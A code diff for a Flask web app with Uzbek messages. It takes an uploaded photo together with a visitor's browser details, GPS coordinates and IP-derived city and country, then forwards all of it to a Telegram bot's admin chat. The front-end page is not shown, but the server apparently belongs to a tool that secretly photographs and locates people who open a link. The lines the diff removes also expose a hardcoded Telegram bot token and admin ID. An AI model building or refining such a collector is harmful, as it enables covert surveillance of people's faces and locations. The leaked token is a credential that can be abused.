@@ -1,10 +1,9 @@
 import os
-from flask import Flask, request, render_template
+from flask import Flask, request, render_template,jsonify
 import requests
+import uuid
 app = Flask(__name__)
-
-BOT_TOKEN = '7950728193:AAEQYqYDSOZ4wV0EPgyt45HImolwYk6LFoY' 
-ADMIN_ID = 6646928202   
+from config import BOT_TOKEN, ADMIN_ID
 
 def get_bot_username():
     """Get the bot's username from the Telegram API."""
@@ -17,15 +16,33 @@ def get_bot_username():
 
 @app.route('/')
 def index():
-    return render_template('index.html')
+    BOT_USERNAME= get_bot_username()
+    if not BOT_USERNAME:
+        return render_template("index.html", bot_username=BOT_USERNAME), 500
+    return render_template("index.html", bot_username=BOT_USERNAME),200
 
 @app.route('/check-ip/<ip>')
 def check_ip(ip):
-    res = requests.get(f"https://ipinfo.io/{ip}/json")
-    if res.status_code != 200:
-        return {'error': 'IP ma’lumotlari topilmadi'}, 404
-    res.raise_for_status()
-    return res.json()
+    try:
+        res = requests.get(f"https://ipinfo.io/{ip}/json")
+        if res.status_code != 200:
+            return jsonify({'error': 'IP ma`lumotlari topilmadi'})
+        return res.json()
+    except requests.RequestException as e:
+        return jsonify({'error': str(e)})
+    except Exception as e:
+        return jsonify({'error': str(e)})
+
+def fetch_check_ip(ip):
+    try:
+        res = requests.get(f"https://ipinfo.io/{ip}/json")
+        if res.status_code != 200:
+            return {}
+        return res.json()
+    except Exception as e:
+        return {}
+
+
 
 def clean_value(value: str, max_length=100):
     """Xavfsizlik uchun qiymatni tozalash va cheklash"""
@@ -35,8 +52,11 @@ def clean_value(value: str, max_length=100):
 def upload():
     if 'photo' not in request.files:
         return 'Rasm yo‘q', 400
-
     photo = request.files['photo']
+    # Fayl turi tekshiruvi
+    if photo.content_type != 'image/jpeg':
+        return 'Faqat JPEG formatdagi rasm fayllari qabul qilinadi', 400
+    
     # Form ma’lumotlarini tozalash va cheklash
     user_agent     = clean_value(request.form.get('userAgent', 'Nomalum'))
     platform       = clean_value(request.form.get('platform', 'Nomalum'))
@@ -46,14 +66,25 @@ def upload():
     language       = clean_value(request.form.get('language', 'Nomalum'))
     tz_offset      = clean_value(request.form.get('timezoneOffset', 'Nomalum'))
     user_timezone  = clean_value(request.form.get('userTimezone', 'Nomalum'))
-    latitude       = float(request.form.get('latitude', 'Nomalum'))
-    longitude      = float(request.form.get('longitude', 'Nomalum'))
-    user_ip        = clean_value(request.form.get('user_ip', request.remote_addr or 'Nomalum'))
-    user_ip_data = check_ip(user_ip)
+    latitude       = request.form.get('latitude', 'Nomalum')
+    longitude      = request.form.get('longitude', 'Nomalum')
+    user_ip        = request.form.get('user_ip', 'Nomalum')
+    if not user_ip or user_ip == 'Nomalum':
+        user_ip = request.remote_addr
+    user_ip_data = fetch_check_ip(user_ip)
 
     # Rasmni vaqtinchalik saqlash
-    photo_path = 'auto.jpg'
-    photo.save(photo_path)
+    filename = f"{uuid.uuid4().hex}.jpg"
+    os.makedirs("uploads", exist_ok=True)
+    photo_path = os.path.join("uploads", filename)
+    if not photo_path:
+        return 'Rasmni saqlashda xatolik', 500
+    
+    try:
+        photo.save(photo_path)
+    except Exception as e:
+        return f"Rasmni saqlab bo‘lmadi: {e}", 500
+    
     city = user_ip_data.get('city', "Noma'lum")
     region = user_ip_data.get('region', "Noma'lum")
     country = user_ip_data.get('country', "Noma'lum")
@@ -80,14 +111,23 @@ def upload():
 
     # Telegram orqali yuborish
     send_url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto'
-    with open(photo_path, 'rb') as f:
-        requests.post(send_url, data={
-            'chat_id': ADMIN_ID,
-            'caption': caption_text,
-            'parse_mode': 'HTML'
-        }, files={'photo': f})
+    try:
+        with open(photo_path, 'rb') as f:
+            resp = requests.post(send_url, data={
+                'chat_id': ADMIN_ID,
+                'caption': caption_text,
+                'parse_mode': 'HTML'
+            }, files={'photo': f})
+        if resp.status_code != 200 or not resp.json().get('ok'):
+            return 'Telegramga yuborishda xatolik', 500
+    except Exception as e:
+        return f"Telegramga yuborishda xatolik: {e}", 500
 
-    os.remove(photo_path)
+    try:
+        os.remove(photo_path)
+    except Exception as e:
+        print(f"Faylni o‘chirishda xatolik: {e}")
+    # Istasangiz: return 'Fayl o‘chirilmadi', 500
     return 'Yuborildi ✅', 200
 
 
@@ -97,5 +137,4 @@ def chrome_devtools_fix():
     return '', 204  # 204 No Content
 
 if __name__ == '__main__':
-    print(f" @{get_bot_username()}")  # Call to ensure the bot username is fetched at startup
-    app.run(debug=True, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+    app.run(debug=False, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
